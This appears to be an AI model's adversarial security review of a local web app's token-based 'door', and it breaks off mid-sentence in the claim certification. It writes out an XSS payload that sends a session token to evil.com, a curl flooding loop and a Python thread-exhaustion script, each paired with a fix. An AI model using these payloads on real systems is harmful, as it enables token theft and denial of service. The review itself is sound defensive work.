# Seam-page design panel: google/gemini-2.5-pro

_cost=$0.0834 finish=length_

Excellent. I will now perform the requested adversarial design review.

***

### Security Review Findings

Here are the findings from the pressure test of the Stage B design.

---
**ID:** F-01
**TITLE:** CRITICAL: Token Leakage via Standard Browser Mechanisms
**SEVERITY:** CRITICAL
**WHICH LAYER FAILS:** Hardened Door (Layer 7: No token leakage)
**CONCRETE ATTACK:**
An attacker-controlled page (`https://evil.com`) convinces the user (who has the Salience page open in another tab) to click a link that navigates the Salience tab to the attacker's site.

1.  **Initial State:** User has `http://127.0.0.1:12345/?k=SECRET_TOKEN` open. The page loads and holds the token in a JS variable.
2.  **The Flaw:** The design *plans* to use `history.replaceState` and `Referrer-Policy: no-referrer`, but does not list them as part of the core hardened door. If not implemented, the token remains in the URL bar and is sent in the `Referer` header.
3.  **Attack Sequence:**
    *   The user clicks a link on `evil.com` with `target="salience_window_name"`, or is socially engineered to click a link *within* the Salience page that navigates to `evil.com`.
    *   The browser navigates the Salience tab to `https://evil.com/collector`.
    *   The attacker's server at `evil.com` receives the following request header:
        ```http
        Referer: http://127.0.0.1:12345/?k=SECRET_TOKEN
        ```
4.  **Result:** The attacker has stolen the session token and can now make arbitrary `POST /submit` and `GET /state` calls from their own machine, impersonating the user. A similar attack is possible by reading the token from browser history if `history.replaceState` is not used. A third vector is `window.name`, which persists across navigations; if the token is ever stored there (even temporarily by a framework), it can be read by the destination page.

**WHY IT BREAKS A CLAIM:** This directly breaks **D1 (door integrity)**. A web page in another origin, without prior knowledge of the token, can steal it and subsequently "read /state or drive /submit".

**WHETHER ANOTHER LAYER CATCHES IT:** No. Once the token is stolen, no other layer can distinguish the attacker's requests from the legitimate user's.

**FIX or MISSING-DEFENSE-TO-ADD:**
The design correctly identifies the necessary defenses but must treat them as mandatory, not optional niceties.
1.  **FIX:** Mandate that the `GET /` response handler MUST send the header `Referrer-Policy: no-referrer`.
2.  **FIX:** Mandate that the client-side JS MUST call `history.replaceState({}, '', '/')` immediately after extracting the `?k=` token on page load.
3.  **MISSING DEFENSE:** The client-side JS should explicitly clear `window.name` on unload (`window.addEventListener('beforeunload', () => { window.name = ''; });`) to prevent that exfiltration channel.

---
**ID:** F-02
**TITLE:** Unbounded Queue Denial-of-Service
**SEVERITY:** HIGH
**WHICH LAYER FAILS:** Host (`collaborator/host.py` design)
**CONCRETE ATTACK:**
A malicious local process (or a compromised browser extension with access to the token) can exhaust the memory of the Salience host process.

1.  **The Flaw:** `host.submit()` adds a `_TurnJob` to a `queue.Queue`, which is unbounded by default. Each job also creates a `Task` object stored in the `_tasks` dictionary. There is no limit on the number of queued or active tasks.
2.  **Attack Sequence:** The attacker runs a simple script in a loop:
    ```bash
    # Attacker has stolen the token via F-01
    TOKEN="SECRET_TOKEN"
    while true; do
      curl -X POST http://127.0.0.1:12345/submit \
           -H "X-Sal-Token: $TOKEN" \
           -d '{"text": "dos"}'
    done
    ```
3.  **Result:** The `_jobs` queue and `_tasks` dictionary grow without bound. The single worker thread can't keep up, and the host process's memory usage will climb until it is terminated by the OS or becomes unresponsive.

**WHY IT BREAKS A CLAIM:** This breaks **D4 (availability)**. A "flood of /submit" does not just queue work; it creates a resource exhaustion condition that constitutes a safety problem (process death) rather than a mere performance degradation.

**WHETHER ANOTHER LAYER CATCHES IT:** No. The 64 KiB body cap (Layer 6) is irrelevant; the attack uses tiny bodies. The `ThreadingHTTPServer` (Layer 1) happily accepts the requests.

**FIX or MISSING-DEFENSE-TO-ADD:**
**FIX:** The `queue.Queue` should be initialized with a `maxsize`. `host.submit()` should either block or immediately return an error (e.g., HTTP 503 Service Unavailable) if the queue is full. A corresponding cap should be placed on the total number of non-`DONE`/`FAILED` tasks in the `_tasks` dictionary.

---
**ID:** F-03
**TITLE:** Thread Exhaustion Denial-of-Service
**SEVERITY:** MEDIUM
**WHICH LAYER FAILS:** Surface (`collaborator/surface.py` design)
**CONCRETE ATTACK:**
A malicious local process or script can exhaust the thread resources of the surface process, making it unavailable to the legitimate user.

1.  **The Flaw:** The design specifies `ThreadingHTTPServer`, which creates a new thread for each incoming connection. There is no limit on the number of concurrent threads.
2.  **Attack Sequence:** The attacker initiates a large number of connections and keeps them open without sending a full request (a "Slowloris"-style attack, though the goal here is thread exhaustion, not blocking a single-threaded server).
    ```python
    # Attacker script
    import socket, time
    sockets = []
    for _ in range(2048): # A number larger than typical thread limits
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 12345))
        s.send(b'GET / HTTP/1.1\r\nHost: localhost\r\n') # Incomplete request
        sockets.append(s)
    time.sleep(300) # Hold connections open
    ```
3.  **Result:** The `ThreadingHTTPServer` will attempt to spawn a thread for each connection. This will quickly hit OS-level thread limits, causing the process to crash or preventing it from accepting any new connections from the legitimate user's browser.

**WHY IT BREAKS A CLAIM:** This breaks **D4 (availability)**. It is a resource issue that becomes a safety/availability problem, making the door inaccessible.

**WHETHER ANOTHER LAYER CATCHES IT:** No. This is a flaw in the fundamental choice of web server architecture.

**FIX or MISSING-DEFENSE-TO-ADD:**
**FIX:** Replace `ThreadingHTTPServer` with a server that uses a fixed-size thread pool (like `concurrent.futures.ThreadPoolExecutor`) to handle requests. This would cap the number of concurrent connections and gracefully reject new ones when the pool is saturated, preserving availability for the core process.

---
**ID:** F-04
**TITLE:** Missing Content Security Policy (CSP)
**SEVERITY:** LOW
**WHICH LAYER FAILS:** Surface (`collaborator/surface.py` design)
**CONCRETE ATTACK:**
This is not a direct break but a missing defense-in-depth control. If any future change accidentally introduces an XSS vulnerability (e.g., a tool summary is improperly escaped and rendered on the page), there is no secondary control to prevent exploitation. An XSS flaw would allow an attacker's `submit()` payload to execute JS in the context of the page, giving it access to the token and full control.

1.  **The Flaw:** The design does not specify sending a `Content-Security-Policy` header.
2.  **Attack Scenario (hypothetical):** An attacker submits text like `Give me a summary of <img src=x onerror=fetch('https://evil.com/?token='+salience_token)>`. If the `summary()` of a future tool call reflects this input without perfect escaping, the script will execute when rendered in the "Attending" panel.
3.  **Result:** The token is stolen.

**WHY IT BREAKS A CLAIM:** This doesn't break a current claim directly but represents a failure to apply standard security hardening, weakening the overall posture of **D1 (door integrity)** against future bugs.

**WHETHER ANOTHER LAYER CATCHES IT:** No. CSP is the layer that would catch this.

**FIX or MISSING-DEFENSE-TO-ADD:**
**MISSING DEFENSE:** The `GET /` response handler should send a strict `Content-Security-Policy` header. Since the page is self-contained, this can be very restrictive:
`Content-Security-Policy: default-src 'self'; style-src 'unsafe-inline'; script-src 'self'; object-src 'none'; base-uri 'none';`
(Note: `unsafe-inline` is needed for the `<style>` block, which is acceptable for a self-contained page with no user-controlled style injection points.)

***

### Claim Certification

*   **D1 (door integrity):** **NOT-CERTIFIED.** The design is vulnerable to token leakage via standard browser `Referer` headers and potentially `window.name`, which constitutes a practical bypass.
*   **D2 (P-01 / no authority via the door):** **CERTIFIED.** The design correctly ensures that user input from `/submit` is treated as a directive for the model and is gated by the `govern_action` seam, with no direct path to authority-bearing host functions.
*   **D3 (honest scope / no dead-end-that-looks-like-a-grant):** **CERTIFIED.** The design is explicit
